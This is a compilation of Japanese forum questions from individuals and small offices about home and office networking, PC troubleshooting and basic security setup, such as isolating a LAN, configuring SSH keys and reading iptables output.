現在、２つのネットワークがSOHO内にあります。 ひとつは、お客様情報などを取り扱うネットワークで、 データベースサーバ１台と複数台のクライアントPCがぶら下がっています。 機密事項もあるので、これはインターネットにはつなげておらず、ローカルなネットワークです。 これをネットワークAとします。 もうひとつは、一般家庭と同じように普通にインターネットにつないでいるネットワークです。 こちらもPCは複数台あります。 これをネットワークBとします。 現在は、AとBの間でのファイルの移動はUSBメモリなどを使用していますが、 ファイルの分散なども発生するので、AとBで共有させたいです。 ついでに、プリンタも共有させたいのです。 すべてを同一ネットワークにすれば、共有できることは分かりますが、 Aについては、インターネットに接続する必要はなく、 むしろ、つながることで、セキュリティ面が心配ですので、外部とは分断されていたほうが望ましいです。 どのように構成・設定すれば、ファイル・プリンタを共有しつつ、安全なネットワーク構築が可能でしょうか？ 何か情報となるサイトの紹介でも構いません。 PCはすべてWindows系です。 簡単な知識はあるつもりです。 （共有フォルダの作り方、アクセス許可設定、共有プリンタの設定など）
閲覧ありがとうございます さくらVPSを借契約して色々と試しているのですが 公開鍵認証の設定ができずに困っています どこが抜けて、あるいは間違えているのか教えてください VPSのOSは"ubuntu 14.04" clientのOSは"windows7"です ssh_config で設定を以下のように変更 ssh 12345 PermitRootLogin no PubkeyAuthentication yes UsePAM no PasswordAuthentication yes #失敗した時のために"yes"にしています .ssh ディレクトリを作成 $mkdir .ssh $chmod 700 .ssh client側でPuTTYを使い公開鍵と秘密鍵を作成 公開鍵をOpenSSHに変換し、VPSに送信 公開鍵を登録、パーミッションの変更 $cat xxx.pub >> $HOME/.ssh/authorized_keys $sudo chmod 600 authorized_keys ユーザーのパーミッションの変更 $chmod 755 /home/user ファイアーウォールは"ufw"で設定しています 変更したsshポートは許可しているので問題はないはずです 公開鍵の登録にコピペをしたいですが、できないため回りくどい方法になっています 何をしても設定ができないようであれば、長いPWを設定して使おうと考えていますが 大丈夫でしょうか？
　今晩は、WINDOWS　VISTAです、宜しくお願いします。 　LAN機能のないHDD（USBのポート有り）をNASとして使いたいのですが、 「HDD＞USB←→LANケーブルポート？＞LANケーブル」というように接続すればNAS としての利用は可能なのでしょうか。 　以上、宜しくお願いします。
2台のデスクトップパソコンを1台のキーボード、モニター、プリンターで使い分けをしたい。 必要なパーツ、方法をご伝授願いたい。
最近以下のようなエラーが頻出します。直し方はあるのでしょうか？ ＞DNS ルックアップでエラーが発生したため、note.mu にあるサーバーを見つけることができません。DNS は、ウェブサイトの名前をインターネット アドレスに変換するためのウェブ サービスです。このエラーはほとんどの場合、インターネットに接続されていないか、ネットワークの設定が間違っていることが原因です。ただし、DNS サーバーの応答がない、ファイアウォールによって Google Chrome からのネットワーク アクセスがブロックされている、などの原因で発生する場合もあります。 　そろそろXPの末路でしょうか、、＞＜
　Windows　VISTAです、宜しくお願いします。 　ワイヤレスネットワークの設定でワイヤレスネットワークプロパティのダイヤログ＞セキュリティタブに、 　「ネットワークがブロードキャストしていない場合でも接続する（０）」というチェック項目がありますが、これはどのような意味でしょうか。 　IPアドレスに「ブロードキャストアドレス」というのがありますが、これと関係あるのでしょうか。 　「ネットワークがブロードキャストした場合」には接続するのは当たり前ですが、 「ネットワークがブロードキャストしていない場合」でも接続する必要ってあるのでしょうか。 　また、「ネットワークがブロードキャストしていない場合でも接続する（０）」にテェックをつけないと、逆にどうなるのでしょうか。 　この項目自体が設定されていることの意味がよく分かりません。 　以上、宜しくお願いします。
サーバに限ったことじゃないかもしれませんが・・・ サーバ（CentOS)にNICを２枚挿し、どちらも同じセグメントに繋いだ時、サーバからインターネットや、ルータやPC1に送信する場合はどちらのNICが優先的に使われるのでしょうか？ NICを複数挿しした場合は必ずどのNICか１つをデフォルトNICとするような設定をしないとこのままでは通信できませんか？ 調べていたらDEFROUTE=yesというのがあり、複数NICの場合は必ずそれをデフォルトNICに指定しないとダメなのかな？と思いまして。基本的なことですみません。 └ルーター（192.168.1.1) 　├PC1（192.168.1.2) 　├サーバ(eth0:192.168.1.100/eth1:192.168.1.200) 　 /etc/sysconfig/network-scripts/ifcfg-eth0 IPADDR=192.168.1.100 NETMASK=255.255.255.0 GATEWAY=192.168.1.1 DNS1=8.8.8.8 DNS2=8.8.4.4 /etc/sysconfig/network-scripts/ifcfg-eth1 IPADDR=192.168.1.200 NETMASK=255.255.255.0 GATEWAY=192.168.1.1 DNS1=8.8.8.8 DNS2=8.8.4.4
急にインターネットが繋がらなくなりました(´；ω；｀) 画面には「インターネット アクセスなし」とかいてあり、コントロールパネルでは「ホームグループ」参加済み、「接続」はWi-Fiの電波がしっかりたっています。 タブレットの方もネットがつながりません。 パソコンはwindows8.1で、ルーターはELECOMlogicのLAN-W301NRです。 パソコン初心者なので優しく教えてくださると嬉しいです。
　Windows　VISTA、家庭内LANでBuffloの無線ルーターを使っています。 　LANのIPアドレスの考え方について教えて下さい、宜しくお願いします。 　無線ルーターの取説には、無線ルーターへのアクセスは、「IpAdress 192.168.11.1（サブネット マスク : 255.255.255.0）」となっていますが、自分のＰＣを調べてみると、「IPv4 アドレス 192.168.0.10（複数のＰＣを同じ無線ルーターから接続しています。）、デフォルトゲートウェイ 192.168.0.1（サブネット マスク : 255.255.255.0）」と表示されます。 　ここで疑問なのですが、無線ルーターへのアクセスが「192.168.11.1」ならデフォルトゲートウェイ、 ＰＣのＩＰも、同じＬＡＮ内にあるはずなので　192.168.11.***となるのではないでしょうか。 　以上ＬＡＮ勉強中の人間の素朴な疑問ですが、宜しくお願いします。
　PC初心者です、宜しくお願いします。 　WINDOWS ７です。 　会社で同じネットワーク（例えばネットワーク名、WORKUGROUP）内にある、 PCのデータを見ようとすると、パスワードの挿入を求められるダイヤログが 表示されます。 　他の人のPCは見ることは出来るのですが、どのようにすると自分のPCに パスワードを設定することが出来るのでしょうか。 　宜しくお願いします。
義理の親族（団塊世代前期高齢者）のパソコン乗換をお手伝いしました。 きっかけは3か月前。 パソコンの話題でOSの話。WindowsXPをいまだ使っているとか。 私　：　えっ？　絶句！　それはヤバい！ 親族：　何がやばい？ 私　：　これだけ報道されているのに・・・とにかくウィルスは怖いですよ 親族：　今まで何もなかったよ。 私　：　今の脅威は、何もなくてもいつの間にかパソコン乗っ取られることもありうるんですよ。 　　　　誤認逮捕事件があったじゃないですか。（その後さらに事態は発展） 親族：　なんだっけそれ？　マニアの事件だろ？俺には関係ないよ。　　　　 私　：とにかくパソコンは買ってください。 親族：今は年金が主要収入だからお金がないよ。あなたは神経質だよ。そこそこで使っていれば大丈夫では？ ・・・・ 結局 WindowsXP終了後　ついにパソコンを買いました。 親戚の使い方ならそんなに高価なものでなくても良いと考えましたが、これまで2台使った某社が良いと言います。 （私はそこのよりは私が今使うメーカーのものを推したかったのですが、いろいろ某社のもので探しました。） セッティングして唖然！愕然！　 　の　ん　き　な　人　っ　て　こ　ん　な　も　の　な　の　で　し　ょ　う　か　？？？ 前のパソコンのウイルス対策ソフト（ノートン）がなんと3年前の版でした。 （前にウイルス対策ソフトについて聞いた時には毎年ノートンのCDを買っていると聞いていました。 　・・・それであれば3台までインストール可能なのでそれを利用すればよいと思っていました。） しかも・・・Windowsアップデートもろくにしていないようです。 とりあえず、新パソコンにはついていたマカフィーを使用してウィルス対策。 でも気になる。 私は、一度ウィルスにやられた2001年以来、ウイルスバスターズ使用です。 ライセンス数を越えはみ出したパソコンはMicrosoft Security Essentials を利用。 ノートンもマカフィーも良くわかりません。 親族にとって安心できるソフトはノートンのようですからネット探して、3202円でノートンの優待版を買いました。　 http://www.amazon.co.jp/%E3%83%8E%E3%83%BC%E3%83 … 私　：　（心の中の声） 身内だから言うんだよ！他人だったらここまで言わないよ！ バカ言うんじゃない！　あんたはセキュリティの大切さがわかってないのか！ ウィルスの仕業で遠隔操作されて顧客情報流れたらどうすんの？ ちょっとはパソコン勉強してよ！あんた工学部で勉強した人でしょ！ 　理　系　出　身　の　人　が　そ　ん　な　に　ル　ー　ズ　で　良　い　の　で　す　か　？ 　俺　は　ド　文　系　出　身　だ　け　ど　こ　こ　ま　で　心　配　し　て　い　る　の　に　。 「のに」という言葉はいけないのですけどね。 http://www.fesh.jp/detail_8391.html 　あんなにしてやったのに　「のに」がつくとぐちがでる　- 相田みつを パソコン教育など受けていないけど会社では情報室が毎週毎週アップデートしろとか いろいろ指示してくるよ。 俺は自分のパソコンでウィルスにもやられたことあるからウィルスウイルス　口酸っぱくして言ってるんだよ！（原因はヱ□　恥ずかしいからあまり言えない。今も楽しみたいからセキュリティには万全を期すつもり。 家人にも内緒のイタズラ用PC（サイトの閲覧用）はセキュリティ強化して個人情報入れずに利用。宅内ではあえて共有ネットワーク対応にしていない。家人にはセキュリティはきちんとしたいからと説明。） セキュリティソフトもちゃんとせず使うことは ・ゴムで避妊せず行為に及んで望まぬ子ができる。病気をもらう。うつす例に例えたいですが・・・ 　そのような下ネタをその親族に言える関係ではないです。 　（リアルの友人になら言いますが。） ・鎧を着ず外に出る。　これではインパクト薄い。 ・予防注射が推奨されているのにしない。 　（当人は予防注射をしたがらない人です。それなのにインフルエンザにかかっています。） ・任意保険に入らずに車を運転する。　この例えが理解しやすいかと思いきや運転をしない人です。 　 （ここが私の気持ち） あなたが80歳なら言いません！ お独りの身ですが、まだまだ先がある人生。インターネットを利用しないのは時代遅れになりますよ。 今はインターネットはインフラですよ。 こもってテレビばかり見るくらいならネットも楽しめるのでは。大してお金かからず楽しいですよ。 価格比較　ネットショッピング・・・（上手に使えば）インターネットの世界には無限の可能性がある。 本当はこれだけ伝えたいのですが・・・当人はいたってのんきで動じません。 当人も年金が主収入。お金かかれば何でもできますがそれを出せとも指示できない。 私はある程度余裕はありますが、年下がおごってばかりじゃ親戚だって卑屈でしょう。 あんたは　金があるから！　と切れられそうです。 こうはなりたくない。 愚だ愚だ　愚痴になりましたが、 ネットセキュリティ危機意識がない人にどうすれば自尊心を傷つけずに理解してもらえるでしょうか。 本当は私の命令に従ってほしい。転んでほしくないから。
はじめまして オークションで入札したiPhone5Sなんですが ロックが掛かっていて 使えません。 出品者に問い合わせたところもう退会していて連絡が取れなくなってます。 このiPhoneはもう使えないのでしょうか? よろしくお願いします!
Adobe ReaderやFlash PlayerがPCにインストールされています。 この2つのソフトですが、ウィルスに狙われやすい（感染などリスクになることが多い） のでしょうか？。 ※常に最新にしておいたほうが良いのでしょうか？
dynabookのパソコンについてです！ (◯◯件の更新プログラムインストール出来ます) みたいな表示が(確か)出ていて、実行したのですが、パソコンが青い画面のまま変わらなくなってしまいました。 説明書や検索をして、ShiftキーやFNキーなど押してみましたが反応ありません。電源を切るとオレンジ点滅で、入れると白い点滅がゆっくり点滅してます。 先生が初期化したら作られたばかりの状態になると言っていたのですが、初期化してしまったのでしょうか？故障でしょうか？不安で仕方ありません。
セキュリティが心配なのでオンラインに接続していないホームネットワークを作り NASに保存した番組などをブルーレイレコーダーで視聴しようと思います DTCP-IPに対応しているNASとレコーダーを持っています しかし、中継する機器がルーター無しでL2スイッチだけでも大丈夫なのか分かりません DTCP-IPの名前にIPとついているのでMACアドレスで管理するL2スイッチだけでは 無理なんですかね？ 詳しい方解説をお願いします
最近、OTPトークンを発行する銀行が増えてきました。個人的には、複数の口座を持っているため、銀行ごとに発行されるのは正直、迷惑です。 家でしかネット接続しないのであれば大きな問題ではありませんが、外出時などにアクセスできることこそが、ネットを使う利便性だからです。 銀行に限らず、セキュリティという口実によって不便を押し付けるソフトウェアは非常に多くあります。質の悪いウェブデザインが使い勝手の悪さをさらに押し下げています。 なぜ使いやすくしようとせず、不便を押し付けようとする風潮なのでしょうか。
先日、質問させていただきましたが、図面をとのご要望をいただきました。しかし、補足で図面を入れられませんので改めさせていただきます。 図面は、5月の状況です。4月は、太枠の2台が新規導入です。 以下は同じ文書です。 いままでＸＰマシン2台、7を１台、VISTAを1台使っていました。これらには、Ａ３スキャナ、ドキュメントスキャナ、フィルムスキャナ、Ａ３プリンタ２台、Ａ４複合機１台をＵＳＢ接続とＡ４複合機のみ無線ＬＡＮでルータに、そして上記ＰＣは、有線ＬＡＮ、無線ＬＡＮ、ＰＬＣ接続でルータに接続し、インターネット接続しています。 ＸＰサポート終了に合わせて、ＷＩＮ７ ６４ＢＩＴ機２台を購入しましたが、ＸＰ２台にインストールされている１６ＢＩＴソフトを使うためにＵＳＢ接続ケーブル（ＲＥＸ-KMSU1）でＸＰマシンと7マシンをつなぎＸＰのみで動くソフトで作成したデータを同ケーブルで７にコピーペーストして、７マシンで印刷をしています。しかし、ＸＰマシンからＬＡＮケーブルをはずしたので、印刷・スキャナができなくなりました。プリンタ・スキャナは、(1)ＵＳＢ切り替え機を使う、(2)インテリジェントＨＵＢを使う？など、いろいろ考えましたが良くわかりません。要は、ＶＩＳＴＡ、７マシン3台のみがインターネットとプリンタ・スキャナが出来、ＸＰマシンは、プリンタとスキャナのみが出来るが、インターネット（ＷＡＮからＸＰマシンへの進入とＸＰマシンからのＷＡＮへの接続は出来ない）はできないという環境を作りたいのです。なにとぞご教示くださいますようお願い申し上げます。
小規模のチャットを運営しているんですが、荒らしに困っています。 PCからの普通の固定IPアドレスであれば、そのまま荒らしのそのIPアドレスを指定して規制すればいいと思うんですが、 今いる荒らしは携帯の変動アドレスを使っているからか、(名義は同じなので同じ人だと思う)毎回末尾の数字が変わっていて完全に規制する事が出来ません。 123.456.xxx.xxx KD123456xxxxxx.au-net.ne.jp KD123.456(例)までは毎回同じですが、下6桁が毎回変わっています。 そこで質問したいのですが、「KD123456」の部分をそのまま指定して規制してしまうとどれくらい影響出るものなのでしょうか。 もう少し正確にいうと「KD123456」の6桁の部分はどれくらいの地域毎に管理されているんでしょうか。 もし他の人への巻き添えがあまり発生しなさそうであれば、そのまま上6桁で規制したいと思うのですが。 よかったらご回答をお願いします。
いままでＸＰマシン2台、7を１台、VISTAを1台使っていました。これらには、Ａ３スキャナ、ドキュメントスキャナ、フィルムスキャナ、Ａ３プリンタ２台、Ａ４複合機１台をＵＳＢ接続とＡ４複合機のみ無線ＬＡＮでルータに、そして上記ＰＣは、有線ＬＡＮ、無線ＬＡＮ、ＰＬＣ接続でルータに接続し、インターネット接続しています。 ＸＰサポート終了に合わせて、ＷＩＮ７ ６４ＢＩＴ機２台を購入しましたが、ＸＰ２台にインストールされている１６ＢＩＴソフトを使うためにＵＳＢ接続ケーブル（ＲＥＸ-KMSU1）でＸＰマシンと7マシンをつなぎＸＰのみで動くソフトで作成したデータを同ケーブルで７にコピーペーストして、７マシンで印刷をしています。しかし、ＸＰマシンからＬＡＮケーブルをはずしたので、印刷・スキャナができなくなりました。プリンタ・スキャナは、(1)ＵＳＢ切り替え機を使う、(2)インテリジェントＨＵＢを使う？など、いろいろ考えましたが良くわかりません。要は、ＶＩＳＴＡ、７マシン3台のみがインターネットとプリンタ・スキャナが出来、ＸＰマシンは、プリンタとスキャナのみが出来るが、インターネット（ＷＡＮからＸＰマシンへの進入とＸＰマシンからのＷＡＮへの接続は出来ない）はできないという環境を作りたいのです。なにとぞご教示くださいますようお願い申し上げます。
メールサーバーにアクセスするときの質問です。。 DNSサーバから返される、アクセスしたいメールサーバーのIPアドレスが、問い合わせるタイミングで異なることがあります。 この場合、DNSサーバから返されるIPアドレスではなく、昔返されたIPアドレスで正常にアクセスできたのですが、この使い方って問題ないでしょうか？ 何か不都合が生じますか？ アクセスできたというのは運がよかっただけでしょうか？ よろしくお願いします
家族の一人に、「真夏の夜の淫夢」が好きな人がいて、それに関するニコニコ動画の動画をでかい音で再生するので迷惑しています。 うるさいし、内容も下品だし、気分が悪いです。 そこで、そういった動画を再生できなくするにはどうしたら良いでしょうか？ ルータに、URLフィルタを設定して、ニコニコ動画へのアクセスを禁止したら一番早いかと思いますが、それは一度使った手ですし、フィルタリングを使っているのが分かりやすいのでもう使いにくいですね。 淫夢関係の動画を再生しようとすると、削除済動画の画面にリダイレクトさせる、あるいはサウンドを再生させなくする、再生しようとすると当該MACアドレスのPCのネットワーク通信その物が遮断されたり、動画の再生に支障がでるぐらい大幅にパケット規制が掛かるようにする、など色々方法を考えているのですが、それをするには一体どうやったらいいでしょうか？ ググって大分調べたのですが、方法がどこにも出ていません。 淫夢嫌いなのでイライラするのでどうにかして下さい、お願いします。
下記2つの秘密鍵を比較しようとしています。 　　１．CSR作成時に同時に作成される秘密鍵 　　２．認証局より受領した証明書と１．の秘密鍵より作成した.p12ファイルから、下記のコマンドで抽出した秘密鍵 　　　　　openssl pkcs12 -in input.pfx -nocerts -out output_key.pem(証明書名はサンプルです。) 同じ秘密鍵なはずなのに、catで開いた証明書の中身が合致しません。 なぜ合致しないかわかる方ご教示いただけないでしょうか。
管理者権限の無いユーザーにパスワードを教えずにコマンドを実行させる方法がないか検討しています。 rusas コマンドでは可能なようですが、パスワードをプロンプト要求されることと、それを回避する方法も難しいようです。 psexecコマンドではユーザー名とパスワードをパラメタで渡すことが可能なようですが、リモートコンピュータでの実行が前提になっているのか、ローカルコンピュータ上での動作がうまくいかないようです。 やりたいことは、ネットワークで繋がっていないPCに対してのIPアドレスの変更です。 IPアドレスを変更していない状態で、PCを異動先へ持って行ってしまったため、リモートでの操作ができないためです。 netshコマンドでアドレスの変更は実現できるようですが、これをローカル管理者権限で動かすバッチさえできれば、そのバッチをcom化してパスワードが見えないようにすればなんとかなるのではないかと思っています。 psexec -u localuser -p password　動作させたいコマンド と入れると、 最後に動作させたいコマンド exited with error code 1 と出てきてエラーになります。 フルパスで入れると、エラーは出なくなります。 これで問題無いとしても、今度はフルパスで決まった場所にコマンドをコピーするのに苦労しますが、他に方法は無いでしょうか？
Linuxのiptablesについて教えてください、初心者です。 VPSを試しに使ってiptablesを勉強しています。 sshから下記を実行しました iptables -F iptables -X iptables -P INPUT DROP iptables -P FORWARD DROP iptables -P OUTPUT DROP iptables -A INPUT -p icmp -j ACCEPT iptables -A INPUT -p tcp -j ACCEPT iptables -A INPUT -p udp -j ACCEPT iptables -A INPUT -i lo -j ACCEPT iptables -A INPUT -p tcp --dport 22 -j ACCEPT iptables -A INPUT -p tcp --sport 22 -j ACCEPT iptables -P INPUT DROP /etc/init.d/iptables save service iptables restart 結果、(1)では22、(2)では22 80、(3)では22 25 80が開いているように表示されてます ブラウザからサーバーにあるホームページは閲覧できません（設定通りで正しいと思います） (1)(2)(3)の違いはなんなのでしょうか？別モノなのでしょうか？ (1)iptables -nL Chain INPUT (policy DROP) target prot opt source destination ACCEPT all -- 0.0.0.0/0 0.0.0.0/0 ACCEPT icmp -- 0.0.0.0/0 0.0.0.0/0 ACCEPT all -- 0.0.0.0/0 0.0.0.0/0 state RELATED,ESTABLISHED ACCEPT tcp -- 0.0.0.0/0 0.0.0.0/0 tcp dpt:22 Chain FORWARD (policy DROP) target prot opt source destination Chain OUTPUT (policy ACCEPT) target prot opt source destination (2)nmap (ホスト名) Starting Nmap 5.51 ( http://nmap.org ) at 2014-05-15 08:04 JST Nmap scan report for ホスト名 (IPアドレス) Host is up (0.000013s latency). Not shown: 998 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 0.09 seconds (3)nmap localhost Starting Nmap 5.51 ( http://nmap.org ) at 2014-05-15 08:01 JST Nmap scan report for localhost (127.0.0.1) Host is up (0.0000070s latency). Other addresses for localhost (not scanned): 127.0.0.1 Not shown: 997 closed ports PORT STATE SERVICE 22/tcp open ssh 25/tcp open smtp 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 0.08 seconds
IEを利用してホームページ等を閲覧する場合、 自動構成スクリプトを使用するを設定している必要があります。 設定は変更等出来ないですが、有る特定のURLのみ除外し プロキシを利用せず閲覧する方法はないでしょうか?。 直接アクセスしたいWEBサーバは社内のポータルです。 ご教示よろしくお願い申し上げます。
会社のサーバーが本社にあり、セキュリティなどすべてそこで管理されてます。 地方支店PCのメールやネット接続などもすべてそのサーバー経由となっています。 質問ですが、PCへ決められたソフト以外のインストールは禁止となっていますが、支店のPCへソフトを無断インストールした場合、本社サーバー管理者にばれるでしょうか？（いかの１，２の場合） （ちなみに通常はインストールはできないようなってますが、申請でAdiministrator権限許可時のみインストール可能となってます。） １．ネット接続しないソフト ２．シリアル確認などでネット接続するソフト（Adobeなど）
特定の接続先以外から接続できないようにするPC設定はできるのでしょうか？社内環境（サーバー、プリンターなど）には接続できるけど、自宅環境（ホームサーバー、NASなど）には接続させたくないのが主旨です。その設定をサーバーやルーター、スイッチ等ではなく、PCに直接設定を行いたいです。PC環境は以下のとおりです。質問は以下のとおりです。 １．PCへそのような設定は出来るのでしょうか？（色々と調べましたが、PCに直接設定を行う具体的な例が見当たりませんでした） ２．可能な場合、どのように設定ができるのか具体的にお教え下さい。（グループポリシーだと、その詳細部分。DOSコマンドだと、利用可能なコマンドの例、利用可能なソフトウェアの紹介でも可） 【PC環境】タブレットPC、OSはWindows8.1、環境はWorkgroup、ネットワークはDHCP接続、IEはProxy接続。 質問内容に際し不足な点がありましたら、その都度回答いたします。
会社のインターネットセキュリティについて質問です。 現状ですごく困っているということはありません。ちょっと不思議なのと、会社の各部署で自衛する必要もありますので、そのための質問です。 会社のパソコンはインターネット接続で一部のサイトをアクセス制限しています。 例えば、Yahoo.jp、Wikipedia、2ちゃんねるがそれに相当します。 これらのサイトのトップページにアクセスすると、会社が設置した「アクセス制限しています」の画面が表示されます。 しかし、Yahooの自分のアカウントのメール画面への直リンクのアドレスの入力、Googleの検索結果としてリストされたWikipedia内の各題目へのリンクのクリック、2ちゃんねるの各板のアドレスの入力では、それらのページが表示され、書き込みもできます。また、それらのページから各サイトのトップページへ移動出来てしまいます。 質問です。 会社のセキュリティ部門の意図がなくこのような状態だとした場合、原因はどのあたりにあると思われますでしょうか。 実際のところセキュリティ部門はこのような状態であることを知りませんし、サイトのトップページをアクセス制限しているのだからその配下(全部が全部配下ではないと思いますけど…)にアクセスできるわけがないという言い分です。 しかし2ch等への書き込みがあるとそのセキュリティ部門から書き込み者が所属する部署の要職に通報されます。 セキュリティ部門の人やスキルの問題もあると思いますが…。
この質問者のＩＰアドレス、ドメイン名、どこから書き込みをしているか調べられる方いませんか？個人情報を不正に入手して掲示板にIDを変えて繰り返し書き込みを繰り返しています。 http://ord.yahoo.co.jp/o/chiebukuro/_ylt=A3JuMEN … メールのヘッダからＩＰアドレスやホストがわかると思いますが、不正にアクセスするなにか情報が入っているのでしょうか？
タイトルの通り指定したページを開かないようにする方法を教えて下さい firefoxにBlockSiteを入れて一応対象のURLを登録してるんですが、 URL先の内容が映らないだけでタブでは開くので タブも開かないような完全に表示されない方法を教えて下さい BlockSite以外のアドオンでも構わないのでお願いします
質問がありますが。iso27001に関してどんなソフトがもっと役に立ちますか。ほしいのは資産インベントリ、リスクアセスメント、情報セキュリティインシデントの管理を備えるものです。 どんなソフトソリューションがもっと相応しいですか。
200-120 CCNA を取得しようと考えています。 試験範囲にISDNが出てきているのですが 実際、業務でISDNに関する仕事はよくあるのでしょうか？ みなさんのご見識を教えて頂けましたら嬉しいです。
様々な突っ込みはしないでいただくと本当に助かります。 社内の不正アクセスについて質問です。 Windowsのフォルダを共有していて、他のPCの特定のユーザーアカウントしかアクセスできないように設定しています。 ここで、当該共有フォルダへアクセスできるユーザーアカウントを正式に所有している人間が、上記とは別のPCに当該共有フォルダへアクセスできるユーザーアカウントを作成し、そのユーザーアカウントのフルネームを変え、別のユーザーとして当該共有フォルダへアクセスしているように見せかけ、アクセスしているとします。 また、そのアカウントは許可なく複数人で共有しています。 合わせて、運用上許可の無いNASへのアクセスを禁止しているとします。 勝手にユーザーアカウントを作成できる状態ということは触れないでいただき（汗）、この場合、ユーザーのフルネームの変更とユーザーアカウントの許可の無い使用、それによるNASへのアクセスは、一般的に不正アクセスと判定していいものなのでしょうか。また会社の内規に従い処罰できるような問題なのでしょうか。
こんにちわ、初めて質問します。 私はマンション住みなのと専門用語に詳しくないので間違っているところがあるかもしれません、ご了承ください。 今回の質問なんですがネットゲームなどリアルタイムで小さな情報をやり取りするときにたまに伝達損失が発生するので原因を調べてみたいところ、ＣＡＴＶでは光方式ではなく光ハイブリット方式というのが使われているらしく、光ハイブリット方式は同軸ケーブルを使うので流合雑音というのが発生して伝達損失が起きるというところまでわかったのですが、この流合雑音の対策の仕方がわかりません。 以下自分で考えた対策一覧になります ＣＡＴＶ社はＪ－ＣＯＭなのですがこれはＪ－ＣＯＭに電話すれば対策してもらえるのでしょうか？ それとも家の中にある同軸ケーブルをいいものにすればいいのでしょうか？ 同軸ケーブルの大元のコネクタの中の本線にフェライトコアをつけるたほうがいいのでしょうか？ （自分は電気工事士2級をもっているので簡単な作業ぐらいならできると思います） ＣＡＴＶ保安器というものが売られていますが、それを買って設置すればいいでしょうか？ （上記のは屋外用がありますが、屋外は無理なので室内になります、室内にはアース線を指す所はありません） 以上自分で考え付いた対策です、これすればいいよ！など他の対策案知ってる方いたら教えてください、また上記ので対策できる方法があったら教えてくださいお願いします。
暗号化っていう情報セキュリティーシステムがあるじゃないですか。これって必要ですか？ 暗号化と似たシステムに、パスワードロックがあります。これがあれば十分では？どちらも秘密のデータを隠し、所有者本人と所有者指名した特定者だけに秘密データを開示し晒す機能（情報セキュリティー機能）を提供します。 「ビートたけしの年収は１０億円」が秘密データで、これをマスコミなどから隠し、本人と少数の関係者だけで共有したいとします。これを成す方法は２つあって、それは暗号化とパスワードロックです。 暗号化 「ビートたけしの年収は円億０１」と書いてあるチラシを大量にプリントして、それをヘリコプターで日本全国にバラまく。マスコミも含めた一般の読者がチラシを拾って読んでも、「円億０１って何だ？ビートたけしの年収がナンボなのかサッパリ分からん」となって、秘密が守られる。１０億円を暗号化して、円億０１という不可解なデータに書き換えているのである。だけど、本人と関係者は逆から読む解読方法を共有していて、円億０１という暗号を１０億円と導き直す事が出来る。２０億円に変わって、その旨を関係者に報告したければ、「オレの年収は円億０２に増えた」とチラシに書いてヘリコプターでバラまく。 パスワードロック 「ビートたけしの年収は１０億円」と書いてあるチラシを大量にプリントして、それを１枚毎に鋼鉄製の封筒の中に入れて密封し、その大量の封筒をヘリコプターで日本全国にバラまく。封筒にはパスワードが仕掛けられていて、正しいパスワードを入力すれば封が開き、チラシを取り出す事が出来る。パスワードはビートたけしと少数の関係者だけが知っている。マスコミも含めた一般人が封筒を拾って中のチラシを取り出したく、テキトーにパスワードを入力するも、ハズレとなって封筒がロックされたままだから、諦めて封筒を捨てる。関係者が拾えば、正しいパスワードを入力してチラシを取り出して、年収１０億円という情報を共有する。 ※ビートたけしの年収は仮の設定です。本当に一致するのかもしれませんが、単なる偶然です。
パソコンで家庭教師募集のサイトを見ていたらこのような画面が出てきてしまいました 正しいユーザー名とパスワードを打ちOKボタンを押したのですがすぐにまた同じ画面が出てきてしまいます 何回も試してみたのですが結果は変わりませんでした キャンセルしても同じ画面が出てきてしまいインターネットが使えない状況になっていますどうすればこの画面が消えるか教えてください
業務で使うPCは、一般のPCと必ずしも同じようにネット接続できる必要は無いと思います。 ということは、たとえば、 　社内のメールサーバー、 　ファイルサーバー、 　プリンタ の３箇所とだけ接続できるような設定が可能なら、情報漏えいや遠隔操作、犯罪の踏み台として利用されてしまうという危険性がかなり低減すると思います。 WinXP、Win7で、「ホワイトリストにあるIPアドレスのパケットだけ通し、それ以外のパケットは廃棄するような設定」方法、ないのでしょうか？ 自動アップデートや時刻あわせ、ネット検索など、いろいろと便利な機能はすべてあきらめることになりますが、これらの危険性を回避するために「オフラインでPCを利用する」ことを考えると、プリンタなどが使えるだけでも、うれしいと思うのですが、いかがでしょう？
OS:Windows7 Home Premiumです。 自分にゲームの起動をさせたくありません。
今日、無料アプリをダウンロードしようとしたら「iTunes使用許諾契約書が更新されました」というダイアログが現れました。 同意しないとダウンロード出来ないみたいです。 同意した場合、料金はかかりますか？
初めて投稿します。 社内で、端末の管理をしています。相応の資格等は持っていません。少し、PCの知識がある程度です。 端末40台のうち5台が、IEの表示が不良です。IEは起動しますが、なかの表示は真っ白か真っ黒。マウスを動かすと、なぞった所だけ、ところどころ表示されますが、なんだか切り貼りしたような画面になってしまいます。 私なりに調べたところ、他の正常な端末は、IE9 ver.9.0.8112.16421 更新ver.9.0.16(KB2829530) となっていましたが、不良の5台は、KB2829530がインストールされていませんでした。また、表示不良のため、バージョンの確認が出来ません。 この更新プログラムが入っていないから表示が不良になると判断し、MSから上記更新プログラム（KB2829530）を手動でダウンロードし、端末それぞれにスタンドアロンでインストールしようとしましたが、「この更新プログラムはお使いのコンピュータには適用出来ません。」と表示されてしまいうまくいきません。 その他、インターネットオプションの確認もしましたが、正常な端末と比べ、特に不具合と思われる箇所はありませんでした。 検討違いのことをしているのでしょうか？ もし、お判りの方がいらっしゃいましたらご教授願います。 ちなみに、システムの環境ですが、外部インターネット環境には、直接には接続していません。イントラネットの環境です。ドメイン環境でもありません。
本社と支店のパソコン環境です、 本社でwindows7のパソコンで無線LANと有線LANの両方をつないでいます。 有線LANはインターネット回線をフレッツ光でルーター接続です。 デフォルトゲートウエイ192.168.24.1です。インターネットと社内システムで利用しています。 無線LANはローカルネットワークでルーターとPanasonicのネットワークカメラカメラの回線（インターネットには出ない）に接続します。こちらは2拠点間をフレッツVPNワイドで接続しているのでこちらもルーターがありそのゲートウエイは192.168.21.1です。 サテライト側（支店）のカメラも監視できるようにしました。 カメラの監視は専用の録画ビューワーソフトを使っています。 で、問題が起きました。 同時に起動すると支店のカメラ画像が見られないです。 推測ですが、インターネット側のデフォルトゲートウエイを先に読むのでVPNのルーターのゲートウエイは見ないのだと思われます。 有線LANを外してこのビューワーソフトを起動させるとこちらのゲートウエイを読み取るのでカメラは 支店の画像も見れます。その後有線LANをつなげばインターネットも見られますし、支店のカメラ画像もみれます。 